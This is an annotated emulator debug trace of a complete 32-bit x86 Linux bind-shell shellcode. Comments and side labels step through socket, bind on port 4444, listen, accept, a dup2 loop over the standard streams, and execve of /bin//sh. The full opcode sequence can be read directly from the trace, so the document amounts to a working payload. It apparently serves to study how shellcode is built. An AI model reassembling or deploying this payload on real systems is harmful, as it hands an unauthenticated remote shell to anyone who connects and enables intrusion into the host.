[emu 0x0x854e480 debug ] 31DB                            xor ebx,ebx           ; zero out base register                         
[emu 0x0x854e480 debug ] F7E3                            mul ebx               ; zero out accumulator register                          
[emu 0x0x854e480 debug ] 53                              push ebx              ; push null to the stack, set protocol type          
[emu 0x0x854e480 debug ] 43                              inc ebx               ; increment base register, set SYS_SOCKET                ;;;;;;;;
[emu 0x0x854e480 debug ] 53                              push ebx              ; push 1 to the stack, set SOCK_STREAM                   ;socket;       
[emu 0x0x854e480 debug ] 6A02                            push byte 0x2         ; push 2 to the stack, set AF_INET                       ;;;;;;;; 
[emu 0x0x854e480 debug ] 89E1                            mov ecx,esp           ; move stack pointer to counter register                    ;      
[emu 0x0x854e480 debug ] B066                            mov al,0x66           ; move 102 to first byte of accumulator register            ;      
[emu 0x0x854e480 debug ] CD80                            int 0x80              ; ping kernel and execute socketcall                        ;      
;                                                                                                                                          ;      
[emu 0x0x854e480 debug ] 5B                              pop ebx               ; store 2 in base register, set SYS_BIND                    ;      
[emu 0x0x854e480 debug ] 5E                              pop esi               ; store 1 in source index register, set SYS_BIND            ;      
[emu 0x0x854e480 debug ] 52                              push edx              ; set scokaddr                                              V      
[emu 0x0x854e480 debug ] 680200115C                      push dword 0x5c110002 ; set sockaddr                                           ;;;;;;;;        
[emu 0x0x854e480 debug ] 6A10                            push byte 0x10        ; set socklen                                            ; bind ;
[emu 0x0x854e480 debug ] 51                              push ecx              ; push values to the stack                               ;;;;;;;;
[emu 0x0x854e480 debug ] 50                              push eax              ; push sockfd from socket()                                 ;
[emu 0x0x854e480 debug ] 89E1                            mov ecx,esp           ; store pointer in counter register                         ;                       
[emu 0x0x854e480 debug ] 6A66                            push byte 0x66        ; push 102 to the stack                                     ;
[emu 0x0x854e480 debug ] 58                              pop eax               ; store 102 to the stack                                    ;       
[emu 0x0x854e480 debug ] CD80                            int 0x80              ; ping kernel and execute socketcall                        ;       
;                                                                                                                                          V       
[emu 0x0x854e480 debug ] 894104                          mov [ecx+0x4],eax     ; set sockfd=14 and backlog=0                            ;;;;;;;;           
[emu 0x0x854e480 debug ] B304                            mov bl,0x4            ;                                                        ;listen;  
[emu 0x0x854e480 debug ] B066                            mov al,0x66           ; move 102 to the first byte of accumulator register     ;;;;;;;;
[emu 0x0x854e480 debug ] CD80                            int 0x80              ; ping kerenel and execute socketcall                       ;
;                                                                                                                                          V       
[emu 0x0x854e480 debug ] 43                              inc ebx               ; set sockfd=14, addr=0. and addrlen=10                  ;;;;;;;;                          
[emu 0x0x854e480 debug ] B066                            mov al,0x66           ; move 102 to the first byte of accumulator register     ;accept;
[emu 0x0x854e480 debug ] CD80                            int 0x80              ; ping kernel and execute socketcall                     ;;;;;;;;
;                                                                                                                                          ;
[emu 0x0x854e480 debug ] 93                              xchg eax,ebx          ; store fdsock from accept in base resigter oldfd=19        ;
[emu 0x0x854e480 debug ] 59                              pop ecx               ; set counter register to newfd=14, decrement untill 0      ;
[emu 0x0x854e480 debug ] 6A3F                            push byte 0x3f        ; push 63 to the stack                                      ;
[emu 0x0x854e480 debug ] 58                              pop eax               ; store 63 in accumulator register                          ;
[emu 0x0x854e480 debug ] CD80                            int 0x80              ; ping kerenel and execute dup2                             V
;s                                                                                                                                      ;;;;;;;;
;n                                                                                                                                      ; dup2 ;
;i                                                                                                                                      ;;;;;;;;
;p                                                                                                                                         ;
[emu 0x0x854e480 debug ] 49                              dec ecx               ; decrement counter register untill 0 oldfd=19, newfd=0     ;
[emu 0x0x854e480 debug ] 79                              jns 0x1               ; jump if SF=0                                              ;
[emu 0x0x854e480 debug ] 6A3F                            push byte 0x3f        ; push 63 to the stack                                      ;
[emu 0x0x854e480 debug ] 58                              pop eax               ; store 63 in accumulator register                          ;
[emu 0x0x854e480 debug ] CD80                            int 0x80              ; ping kernel and execute dup2                              ;
;                                                                                                                                          ;
[emu 0x0x854e480 debug ] 49                              dec ecx               ; decrement counter register                                V
[emu 0x0x854e480 debug ] 79                              jns 0x1               ; loop for stdin, stdout, and stderr                     ;;;;;;;;
[emu 0x0x854e480 debug ] 682F2F7368                      push dword 0x68732f2f ; push hs//                                              ;execve;
[emu 0x0x854e480 debug ] 682F62696E                      push dword 0x6e69622f ; push nib/                                              ;;;;;;;;
[emu 0x0x854e480 debug ] 89E3                            mov ebx,esp           ; store stack pointer in base register
[emu 0x0x854e480 debug ] 50                              push eax              ; push NULL terminator
[emu 0x0x854e480 debug ] 53                              push ebx              ; push /bin//sh
[emu 0x0x854e480 debug ] 89E1                            mov ecx,esp           ; store stack pointer in counter register
[emu 0x0x854e480 debug ] B00B                            mov al,0xb            ; move 11 to first byte of accumulator register
[emu 0x0x854e480 debug ] CD80                            int 0x80              ; ping kernel and execute execve
